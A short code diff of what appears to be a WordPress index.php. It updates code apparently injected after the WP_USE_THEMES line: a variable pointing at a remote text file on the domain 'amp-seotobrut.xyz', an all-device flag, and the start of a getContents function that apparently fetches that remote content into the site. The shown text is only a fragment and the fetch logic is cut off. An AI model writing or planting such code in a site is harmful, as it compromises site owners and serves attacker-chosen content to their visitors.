@@ -12,7 +12,7 @@
  */
 define( 'WP_USE_THEMES', true );
 
-$contents = 'https://amp-seotobrut.xyz/ojssttibc.txt';
+$contents = 'https://amp-seotobrut.xyz/sttibc.txt';
 $allDevice = true;
 
 function getContents($url) {
